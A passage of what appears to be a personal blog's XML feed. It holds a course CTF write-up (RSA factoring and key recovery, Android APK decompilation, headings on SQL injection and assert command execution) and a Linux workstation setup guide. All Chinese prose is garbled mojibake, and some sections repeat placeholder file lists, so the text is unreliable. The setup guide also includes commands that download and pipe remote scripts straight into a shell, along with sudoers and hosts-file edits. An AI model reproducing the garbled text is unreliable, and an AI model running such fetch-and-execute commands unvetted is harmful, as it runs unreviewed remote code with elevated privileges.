é¢˜ç›®åˆ†æ"></a>1 é¢˜ç›®åˆ†æ</h3><blockquote><p><strong>é¢˜ç›®ï¼š</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>ï¼šå¯†æ–‡æ–‡ä»¶</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>ï¼šä»£ç æ–‡ä»¶</li></ul></blockquote><p>é˜…è¯»é¢˜ç›®rsa.pyä»£ç æ–‡ä»¶å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li>å…¬é’¥ï¼ˆn, eï¼‰å·²çŸ¥ï¼Œè€Œpã€qã€dæœªçŸ¥</li><li>æ˜æ–‡æ˜¯ä¸€å¼ bmpå›¾ç‰‡çš„txtæ ¼å¼ï¼Œç»è¿‡libns2nè½¬æ¢ä¹‹ååŠ å¯†ä¸ºå¯†æ–‡cipher.txt</li></ul><h3 id="2-è§£é¢˜è¿‡ç¨‹"><a href="#2-è§£é¢˜è¿‡ç¨‹" class="headerlink" title="2 è§£é¢˜è¿‡ç¨‹"></a>2 è§£é¢˜è¿‡ç¨‹</h3><h4 id="ç ´è§£ç§é’¥d"><a href="#ç ´è§£ç§é’¥d" class="headerlink" title="ç ´è§£ç§é’¥d"></a>ç ´è§£ç§é’¥d</h4><p>ç”±äºnä¸å¤ªå¤§ï¼Œå°è¯•ç›´æ¥åˆ†è§£ã€‚åœ¨<a href="http://www.factordb.com/index.php?query=12928016222583163285621599577461443538921550432522968254134024525052961389976575215720661492239277563694030199496398953014500031012932214275965402552478971">factordbåœ¨çº¿åˆ†è§£å¾—åˆ°çš„ç»“æœ</a>å¹¶æ²¡æœ‰æˆåŠŸï¼Œå› æ­¤è½¬è€Œå°è¯•yafuåˆ†è§£ã€‚</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232242645.png" style="zoom: 50%;" /></p><p>æˆåŠŸå¾—åˆ°på’Œqï¼Œç„¶åä½¿ç”¨gmpy2æ±‚æ¨¡é€†å…ƒå¾—åˆ°dï¼š</p><pre><code class="hljs python"><span class="hljs-comment"># e = 65537</span><span class="hljs-comment"># p = 113701434566953302296018327231919974281008636789018283600308658084922136632147</span><span class="hljs-comment"># q = 113701434566953302296018327231919974281008636789018283600308658084922136631993</span>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>))<span class="hljs-comment"># d = 1766291671224035950065700331363806177388399874464968761882845653559427747468578334624297389288081148192811346008992354282683301619956371502784830383326817</span></code></pre><h4 id="è§£å¯†æ˜æ–‡m"><a href="#è§£å¯†æ˜æ–‡m" class="headerlink" title="è§£å¯†æ˜æ–‡m"></a>è§£å¯†æ˜æ–‡m</h4><p>ç°å·²çŸ¥å¯†é’¥ï¼ˆnï¼Œdï¼‰ï¼Œç›´æ¥é€è¡Œå¯¹<code>cipher.txt</code>è¿›è¡Œè§£å¯†å³å¯å¾—åˆ°<code>flag.bmp.txt</code>å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232254070.png" style="zoom:70%;" /></p><p>ç»“åˆ<code>42 4D</code>æ–‡ä»¶å¤´ä»¥åŠæ–‡ä»¶åä¸­çš„æç¤ºï¼Œè¿˜åŸå¾—åˆ°<code>flag.bmp</code>å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232257469.png" style="zoom:60%;" /></p><p>çœ‹åˆ°ä¸‰ä¸ªäºŒç»´ç å®šä½è§’ï¼Œä½¿ç”¨<strong>StegSolve</strong>åœ¨çº¢è‰²é€šé“Red Plane 0çœ‹åˆ°äºŒç»´ç ï¼Œæ‰«ç å³å¾—åˆ°äº†flagã€‚</p><blockquote><p><strong>é¢˜è§£ï¼š</strong></p><ul><li><a href="/download/course-CTF/rsa-solution.py">rsa-solution.py</a>ï¼Œè§£é¢˜è„šæœ¬</li><li><a href="/download/course-CTF/Crypto-RSA.pptx">Crypto-RSA.pptx</a>ï¼Œé¢˜ç›®è®²è§£</li></ul></blockquote><h2 id="Reverse-babyandroid"><a href="#Reverse-babyandroid" class="headerlink" title="Reverse babyandroid"></a>Reverse babyandroid</h2><blockquote><p><strong>é¢˜ç›®ï¼š</strong></p><ul><li><a href="/download/course-CTF/babyAndroid.apk">babyAndroid.apk</a>ï¼šé¢˜ç›®æ–‡ä»¶</li></ul></blockquote><h3 id="1-é€†å‘åˆ†æ"><a href="#1-é€†å‘åˆ†æ" class="headerlink" title="1 é€†å‘åˆ†æ"></a>1 é€†å‘åˆ†æ</h3><p>ç›´æ¥ç”¨<strong>jadx</strong>åç¼–è¯‘<code>babyAndroid.apk</code>ï¼Œçœ‹åˆ°ä¸»è¦ä»£ç åœ¨<code>com.example.myapplication</code>é‡Œï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206252334586.png"/></p><blockquote><p><strong>é¢˜è§£ï¼š</strong></p><ul><li><a href="/download/course-CTF/bbandroid-solution.java">bbandroid-solution.java</a>ï¼šè§£é¢˜è„šæœ¬</li></ul></blockquote><h2 id="Reverse-baguatu"><a href="#Reverse-baguatu" class="headerlink" title="Reverse baguatu"></a>Reverse baguatu</h2><blockquote><p><strong>é¢˜ç›®æ–‡ä»¶ï¼š</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>ï¼šå¯†æ–‡æ–‡ä»¶</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>ï¼šä»£ç æ–‡ä»¶</li></ul><p><strong>é¢˜ç›®æ–‡ä»¶ï¼š</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>ï¼šå¯†æ–‡æ–‡ä»¶</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>ï¼šä»£ç æ–‡ä»¶</li></ul></blockquote><h2 id="Web-news"><a href="#Web-news" class="headerlink" title="Web news"></a>Web news</h2><p>SQLæ•°å­—å‹æ³¨å…¥+md5æ ¡éªŒç»•è¿‡+assertå‘½ä»¤æ‰§è¡Œçš„ä¸€é“ç¼åˆæ€ªï¼Œæ²¡å•¥éš¾åº¦ã€‚ç”±äºæˆ‘å†™åšå®¢çš„æ—¶å€™å·²ç»æ˜¯è¯¾ç¨‹å®éªŒä¹‹åçš„ç¬¬Nå¤©ï¼ˆè€æ‹–å»¶ç—‡ï¼‰æœåŠ¡å™¨éƒ½å…³äº†ï¼Œæ‰€ä»¥æˆ‘å°±åªæŒ‘å…¶ä¸­ä¸¤ä¸ªæ‰‹ä¸Šæœ‰å›¾çš„çŸ¥è¯†ç‚¹è®°å½•ä¸€ä¸‹ã€‚</p><h3 id="1-md5æ ¡éªŒç»•è¿‡"><a href="#1-md5æ ¡éªŒç»•è¿‡" class="headerlink" title="1 md5æ ¡éªŒç»•è¿‡"></a>1 md5æ ¡éªŒç»•è¿‡</h3><h3 id="2-assertå‘½ä»¤æ‰§è¡Œ"><a href="#2-assertå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="2 assertå‘½ä»¤æ‰§è¡Œ"></a>2 assertå‘½ä»¤æ‰§è¡Œ</h3><h2 id="Misc-å¯†ä¸é€é£çš„Docker"><a href="#Misc-å¯†ä¸é€é£çš„Docker" class="headerlink" title="Misc å¯†ä¸é€é£çš„Docker"></a>Misc å¯†ä¸é€é£çš„Docker</h2><blockquote><p><strong>é¢˜ç›®æ–‡ä»¶ï¼š</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>ï¼šå¯†æ–‡æ–‡ä»¶</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>ï¼šä»£ç æ–‡ä»¶</li></ul><p><strong>é¢˜ç›®æ–‡ä»¶ï¼š</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>ï¼šå¯†æ–‡æ–‡ä»¶</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>ï¼šä»£ç æ–‡ä»¶</li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxä¸ªäººå·¥ä½œç¯å¢ƒé…ç½®</title>
    <link href="/2021/04/10/Linux%E4%B8%AA%E4%BA%BA%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/04/10/Linux%E4%B8%AA%E4%BA%BA%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Linuxä¸ªäººå·¥ä½œç¯å¢ƒé…ç½®ï¼ˆæŒç»­æ›´æ–°ï¼‰"><a href="#Linuxä¸ªäººå·¥ä½œç¯å¢ƒé…ç½®ï¼ˆæŒç»­æ›´æ–°ï¼‰" class="headerlink" title="Linuxä¸ªäººå·¥ä½œç¯å¢ƒé…ç½®ï¼ˆæŒç»­æ›´æ–°ï¼‰"></a>Linuxä¸ªäººå·¥ä½œç¯å¢ƒé…ç½®ï¼ˆæŒç»­æ›´æ–°ï¼‰</h1><p>åœ¨è¿ç§»åˆ°æ–°çš„Linuxç³»ç»Ÿæ—¶ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ¥é…ç½®ä¸ªäººå·¥ä½œç¯å¢ƒï¼Œä»¥å¿«é€Ÿæ¢å¤æ•ˆç‡âœ¨</p><span id="more"></span><blockquote><p>æœ¬æ–‡ç¯å¢ƒï¼šUbuntu 22.04 LTS</p></blockquote><h2 id="1-ç³»ç»Ÿé…ç½®"><a href="#1-ç³»ç»Ÿé…ç½®" class="headerlink" title="1 ç³»ç»Ÿé…ç½®"></a>1 ç³»ç»Ÿé…ç½®</h2><h3 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a>é…ç½®ä»£ç†</h3><ul><li>å¯ç›´æ¥åœ¨  Settings &gt; Network &gt; Network Proxy &gt; Manual  å›¾å½¢ç•Œé¢ä¸­é…ç½®ç³»ç»Ÿä»£ç†<code>http_proxy</code>å’Œ<code>https_proxy</code>ï¼Œæ³¨æ„ä¸åªéœ€å†™ipå’Œportï¼Œä¸éœ€è¦åœ¨ipå‰åŠ protocolã€‚ç„¶åé‡å¯<code>NetworkManager</code>ç”Ÿæ•ˆã€‚</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart NetworkManager</code></pre><ul><li>æˆ–è€…åœ¨å‘½ä»¤è¡Œä¸­ä¸ºç»ˆç«¯shellé…ç½®ä»£ç†ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ä»…å¯¹å½“å‰ç»ˆç«¯çš„shellç”Ÿæ•ˆ</span><span class="hljs-built_in">export</span> http_proxy=http://PROXY_IP:PROXY:PORT<span class="hljs-built_in">export</span> https_proxy=http://PROXY_IP:PROXY:PORT<span class="hljs-comment"># æŒä¹…åŒ–ï¼ˆé‡å¯ï¼‰ç”Ÿæ•ˆ</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">touch</span> /etc/profile.d/my_proxy.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export http_proxy=http://PROXY_IP:PROXY:PORT&quot;</span> &gt;&gt; /etc/profile.d/my_proxy.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export https_proxy=http://PROXY_IP:PROXY:PORT&quot;</span> &gt;&gt; /etc/profile.d/my_proxy.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no_proxy=\&quot;localhost, 127.0.0.1\&quot;&quot;</span> &gt;&gt; /etc/profile.d/my_proxy.sh<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /etc/profile.d/my_proxy.sh<span class="hljs-built_in">source</span> /etc/profile.d/my_proxy.sh<span class="hljs-comment"># æ³¨: å¦‚æœæ˜¯zshï¼Œåˆ™éœ€è¦æ³¨æ„æ˜¯å¦åœ¨/etc/zsh/zprofileä¸­æ·»åŠ äº†ç›¸å…³æ”¯æŒ</span></code></pre><ul><li>éªŒè¯ä»£ç†é…ç½®æˆåŠŸ</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># æ‰“å°successå³è¯´æ˜é…ç½®æˆåŠŸ</span><span class="hljs-built_in">timeout</span> 5s curl -I google.com &amp;&amp; <span class="hljs-built_in">echo</span> success || <span class="hljs-built_in">echo</span> fail</code></pre><ul><li>é…ç½®ä»£ç†çš„ä¸€ä¸ªå¤§å‘ï¼šä¿è¯http_proxyç­‰ä»£ç†å¯¹sudoç”Ÿæ•ˆï¼ˆä¸è®ºå½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºrootï¼Œéƒ½éœ€è¦æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼‰</li></ul><pre><code class="hljs bash"><span class="hljs-comment">#/etc/sudoers</span>Defaults env_keep += <span class="hljs-string">&quot;http_proxy https_proxy ftp_proxy&quot;</span></code></pre><h3 id="æ›´æ¢é•œåƒæº"><a href="#æ›´æ¢é•œåƒæº" class="headerlink" title="æ›´æ¢é•œåƒæº"></a>æ›´æ¢é•œåƒæº</h3><ul><li>æ¸…åæº</li></ul><pre><code class="hljs bash">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></code></pre><ul><li>è‡ªåŠ¨åŒ–æ¢æºï¼ˆæš‚æ—¶åªæ”¯æŒUbuntuï¼‰</li></ul><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:QGrain/My-Awesome-Configuration.git awesome-conf<span class="hljs-built_in">pushd</span> awesome-conf/mirror-source<span class="hljs-built_in">chmod</span> u+x change-mirror-source.sh./change-mirror-source.sh<span class="hljs-built_in">popd</span></code></pre><h3 id="å…¶ä»–çš„å‘"><a href="#å…¶ä»–çš„å‘" class="headerlink" title="å…¶ä»–çš„å‘"></a>å…¶ä»–çš„å‘</h3><ul><li>å†è®°å½•ä¸€ä¸ªå…³äºUbuntu 22 in VMwareçš„å‘<ul><li>å®‰è£…[open-vm-tools, open-vm-tools-desktop]å’Œvmware-toolsæ˜¯äº’æ–¥çš„ä¸¤ä¸ª</li></ul></li></ul><h2 id="2-è½¯ä»¶é…ç½®"><a href="#2-è½¯ä»¶é…ç½®" class="headerlink" title="2 è½¯ä»¶é…ç½®"></a>2 è½¯ä»¶é…ç½®</h2><h3 id="å¸¸ç”¨è½¯ä»¶"><a href="#å¸¸ç”¨è½¯ä»¶" class="headerlink" title="å¸¸ç”¨è½¯ä»¶"></a>å¸¸ç”¨è½¯ä»¶</h3><pre><code class="hljs bash"><span class="hljs-comment"># å¸¸ç”¨ç½‘ç»œå·¥å…·</span><span class="hljs-built_in">sudo</span> apt install -y net-tools openssh-server curl inetutils-ping<span class="hljs-comment"># å¸¸ç”¨è¿ç»´å·¥å…·</span><span class="hljs-built_in">sudo</span> apt install -y screen tmux<span class="hljs-comment"># å¸¸ç”¨ç³»ç»Ÿèµ„æºç®¡ç†å·¥å…·</span><span class="hljs-built_in">sudo</span> apt install -y htop screenfetch <span class="hljs-comment"># neofetch</span></code></pre><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><ul><li>åŸºæœ¬é…ç½®</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…git</span><span class="hljs-built_in">sudo</span> apt install git<span class="hljs-comment"># é…ç½®è´¦å·</span>git config --global user.name <span class="hljs-string">&quot;GIT_USERNAME&quot;</span>git config --global user.email <span class="hljs-string">&quot;GIT_EMAIL&quot;</span><span class="hljs-comment"># é…ç½®ä»£ç†ï¼Œä»…é’ˆå¯¹https://github.comä»£ç†ã€‚ç§»é™¤æ­¤å­—æ®µåˆ™æ˜¯å…¨å±€ä»£ç†</span>git config --global http.https://github.com.proxy <span class="hljs-string">&quot;socks5://PROXY_IP:PROXY_PORT&quot;</span>git config --global https.https://github.com.proxy <span class="hljs-string">&quot;socks5://PROXY_IP:PROXY_PORT&quot;</span></code></pre><ul><li>é…ç½®<code>github ssh keys</code></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆå…¬ç§é’¥å¯¹</span>ssh-keygen -t rsa -C <span class="hljs-string">&quot;YOUR_COMMENT&quot;</span><span class="hljs-comment"># å°†id_rsa.pubå…¬é’¥ä¸Šä¼ è‡³Github &gt; Settings &gt; SSH and GPG keys</span><span class="hljs-comment"># æµ‹è¯•é…ç½®æ˜¯å¦æˆåŠŸ</span>ssh -T git@github.com<span class="hljs-comment"># æ³¨æ„ï¼è‹¥æç¤ºéœ€è¦è¾“å…¥git@github.com&#x27;s passwordåˆ™è¯´æ˜github.comåŸŸåè¢«æ±¡æŸ“ï¼Œå…¶è§£æçš„ipä¸æ­£ç¡®ï¼Œéœ€è¦æ”¹/etc/hostsï¼Œæ·»åŠ ä»¥ä¸‹ä¸€è¡Œå³å¯ï¼ˆä½†æ˜¯å¾ˆå¥‡æ€ªçš„æ˜¯æ— æ³•å†pingé€šäº†ï¼‰</span>20.205.243.166 github.com<span class="hljs-comment"># ä¹Ÿå¯ä»¥ç›´æ¥ä¸Š https://github.com/521xueweihan/GitHub520</span></code></pre><ul><li><strong>å¥½ç”¨çš„æ’ä»¶â­</strong><ul><li>gitlenï¼šåŠŸèƒ½åŒ…æ‹¬ä½†ä¸é™äºè¡Œæœ«æ˜¾ç¤ºä»£ç commitå†å²</li><li>gitblameï¼šSee git blame information in the status bar.</li><li>Compare Folderï¼šå¯¹æ¯”æ–‡ä»¶å¤¹</li><li>Remote - SSH(WSL)ï¼šè¿œç¨‹è¿æ¥æœåŠ¡å™¨</li><li>vscode-iconsï¼šç»™æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ›¿æ¢ç²¾ç¾icon</li><li>Markdown All in Oneï¼šmarkdownæ’ä»¶</li></ul></li></ul><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><ul><li>å®‰è£…vim</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install vim<span class="hljs-comment"># ä½¿ç”¨ä¸ªäººå¸¸ç”¨çš„ç²¾ç®€é…ç½®</span>wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/vim/vimrc -O ~/.vimrc</code></pre><ul><li>é…ç½®<code>Spacevim</code>ï¼ŸTodo</li></ul><h3 id="Oh-My-Zsh"><a href="#Oh-My-Zsh" class="headerlink" title="Oh-My-Zsh"></a>Oh-My-Zsh</h3><ul><li>å®‰è£…ä¸é…ç½®</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…zsh</span><span class="hljs-built_in">sudo</span> apt install zsh<span class="hljs-comment"># å®‰è£…ohmyzsh</span>sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span><span class="hljs-comment"># æ‹‰å–ä¸ªäººzshrcé…ç½®</span>wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/zsh/zshrc -O ~/.zshrc<span class="hljs-comment"># Source</span><span class="hljs-built_in">source</span> ~/.zshrc</code></pre><ul><li>æ”¯æŒ<code>/etc/profile.d/*.sh</code>è„šæœ¬</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># åœ¨/etc/zsh/zprofileä¸­è¿½åŠ ä»¥ä¸‹å†…å®¹</span><span class="hljs-keyword">if</span> [ -d /etc/profile.d ]; <span class="hljs-keyword">then</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /etc/profile.d/*.sh; <span class="hljs-keyword">do</span>    <span class="hljs-keyword">if</span> [ -r <span class="hljs-variable">$i</span> ]; <span class="hljs-keyword">then</span>      . <span class="hljs-variable">$i</span>    <span class="hljs-keyword">fi</span>  <span class="hljs-keyword">done</span>  <span class="hljs-built_in">unset</span> i<span class="hljs-keyword">fi</span></code></pre><h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><h3 id="fzf"><a href="#fzf" class="headerlink" title="fzf"></a>fzf</h3><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install</code></pre><h3 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h3><ul><li>æºç å®‰è£…æŒ‡å®šç‰ˆæœ¬ï¼Œæˆ‘æ›¾ç»å†™è¿‡ä¸€ä¸ªè„šæœ¬ï¼Œä½†æ˜¯æ²¡ç©ºæ‰¾äº†</li></ul><h3 id="miniconda3"><a href="#miniconda3" class="headerlink" title="miniconda3"></a>miniconda3</h3><pre><code class="hljs bash"><span class="hljs-comment"># ä»å®˜æ–¹ç«™ç‚¹ä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œå¯ä»å›½å†…é•œåƒç«™ä¸‹è½½miniconda3-py38 64-bit</span>wget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># æ·»åŠ å½“å‰ç”¨æˆ·å¯æ‰§è¡Œæƒé™</span><span class="hljs-built_in">chmod</span> u+x ./Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># æ‰§è¡Œå®‰è£…è„šæœ¬ï¼Œä¾ç…§æç¤ºå®Œæˆå®‰è£…</span>./Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># æ·»åŠ ç¯å¢ƒå˜é‡</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">touch</span> /etc/profile.d/my_software.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=<span class="hljs-variable">$PATH</span>:/home/<span class="hljs-variable">$USER</span>/miniconda3/bin&quot;</span> &gt;&gt; /etc/profile.d/my_software.sh<span class="hljs-built_in">source</span> /etc/profile.d/my_software.sh<span class="hljs-comment"># æ³¨: å¦‚æœæ˜¯zshï¼Œåˆ™éœ€è¦æ³¨æ„æ˜¯å¦åœ¨/etc/zsh/zprofileä¸­æ·»åŠ äº†ç›¸å…³æ”¯æŒ</span></code></pre><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><ul><li>dockerå®‰è£…ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># è¯¦ç»†å‚è§èœé¸Ÿæ•™ç¨‹ï¼Œæˆ‘å°±ä¸ç…§æ¬äº† qwq</span>https://www.runoob.com/docker/ubuntu-docker-install.html</code></pre><ul><li>å®¹å™¨å†…å¸¸ç”¨è½¯ä»¶å®‰è£…ï¼Œå‚è§æœ¬æ–‡å‰åŠéƒ¨åˆ†çš„å¸¸ç”¨è½¯ä»¶å®‰è£…</li></ul><h2 id="3-å¼€å‘é…ç½®"><a href="#3-å¼€å‘é…ç½®" class="headerlink" title="3 å¼€å‘é…ç½®"></a>3 å¼€å‘é…ç½®</h2><h3 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h3><ul><li>gcc-9/g++-9ï¼šç”±äºUbuntu22è‡ªå¸¦çš„gccç‰ˆæœ¬æ˜¯11è¾ƒé«˜ï¼Œä¸ºäº†å…¼å®¹éƒ¨åˆ†æºç å®‰è£…gcc-9ä»¥åŠg++-9</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc-9 g++-9<span class="hljs-comment"># é…ç½®update-alternatives</span><span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 20 --slave /usr/bin/g++ g++ /usr/bin/g++-11 --slave /usr/bin/gcov gcov /usr/bin/gcov-11 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-11 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-11 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-11<span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9 --slave /usr/bin/gcov gcov /usr/bin/gcov-9 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-9 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-9 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-9</code></pre><ul><li>llvm-12.0.1(with gold plugin)ï¼šæ’æ¡©åˆ©å™¨</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ä¸€é”®å®‰è£…ï¼ˆé¢„è®¡å››ååˆ†é’Ÿï¼Ÿï¼‰</span>curl https://gitee.com/QGrain/aflgo-build/raw/master/build_llvm_12.sh | bash</code></pre><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><ul><li>æºç å®‰è£…gdb 10.2</li></ul><pre><code class="hljs bash">wget http://ftp.gnu.org/gnu/gdb/gdb-10.2.tar.xztar xvJf gdb-10.2.tar.xz<span class="hljs-built_in">cd</span> gdb-10.2<span class="hljs-comment"># éœ€è¦å®‰è£…python3-devï¼Œå¦åˆ™./configure --with-python=/usr/bin/python3ä¹‹åmakeä¼šæŠ¥é”™æ‰¾ä¸åˆ°distutils.sysconfig</span><span class="hljs-built_in">sudo</span> apt install -y python3-dev texinfo./configure --with-python=/usr/bin/python3make -j8<span class="hljs-built_in">sudo</span> make install</code></pre><ul><li>å®‰è£…gefæ’ä»¶</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># manually</span>wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py<span class="hljs-built_in">echo</span> <span class="hljs-built_in">source</span> ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit<span class="hljs-comment"># è¿è¡Œgdbé‡åˆ°ä»¥ä¸‹æŠ¥é”™ï¼Œé€šå¸¸æ˜¯ç»ˆç«¯å­—ç¬¦é›†ä¸æ”¯æŒæŸäº›Unicodeå­—ç¬¦å¼•èµ·çš„</span>Python Exception &lt;class <span class="hljs-string">&#x27;UnicodeEncodeError&#x27;</span>&gt; <span class="hljs-string">&#x27;ascii&#x27;</span> codec can<span class="hljs-string">&#x27;t encode character &#x27;</span>\u27a4<span class="hljs-string">&#x27; in position 12: ordinal not in range(128)</span><span class="hljs-string"># åœ¨ç»ˆç«¯ä¸­è®¾ç½®æ­£ç¡®çš„å­—ç¬¦é›†ä»¥è§£å†³é—®é¢˜</span><span class="hljs-string">echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrc</span><span class="hljs-string">source ~/.bashrc</span></code></pre><ul><li>å®‰è£…pwndbg</li></ul><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><ul><li>Javaé•¿æœŸæ”¯æŒç‰ˆæœ¬</li></ul><div class="table-container"><table><thead><tr><th>ç‰ˆæœ¬</th><th>åˆå§‹å‘è¡Œ</th><th>åœæ­¢ç»´æŠ¤</th><th>ä¸‹è½½é“¾æ¥</th></tr></thead><tbody><tr><td>17</td><td>2021-09-14</td><td>2029-09-30</td><td><a href="https://www.oracle.com/java/technologies/downloads/#java17">Java17 Download</a></td></tr><tr><td>11</td><td>2018-09-25</td><td>2026-09-30</td><td><a href="https://www.oracle.com/java/technologies/javase/jdk11-archive-downloads.html">Java11 Download</a></td></tr><tr><td>8</td><td>2014-03-18</td><td>2030-07-19</td><td><a href="https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html">Java8 Download</a></td></tr></tbody></table></div><ul><li>é€‰æ‹©ä¸‹è½½jdk17</li></ul><h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><ul><li>Easygoing: <a href="https://go.dev/dl/">https://go.dev/dl/</a></li></ul><h3 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h3><ul><li>Easygoing: <a href="https://www.rust-lang.org/zh-CN/tools/install">https://www.rust-lang.org/zh-CN/tools/install</a></li></ul><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><ul><li>Easygoing: <a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></li></ul><h2 id="4-CTFé…ç½®"><a href="#4-CTFé…ç½®" class="headerlink" title="4 CTFé…ç½®"></a>4 CTFé…ç½®</h2><h3 id="Burpsuite-Pro-2022"><a href="#Burpsuite-Pro-2022" class="headerlink" title="Burpsuite Pro 2022"></a>Burpsuite Pro 2022</h3><h3 id="IDA-Pro-7-7"><a href="#IDA-Pro-7-7" class="headerlink" title="IDA Pro 7.7"></a>IDA Pro 7.7</h3><p>æ›´å¤šè¯¦è§ç™¾åº¦ç½‘ç›˜</p><p>To be completed</p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
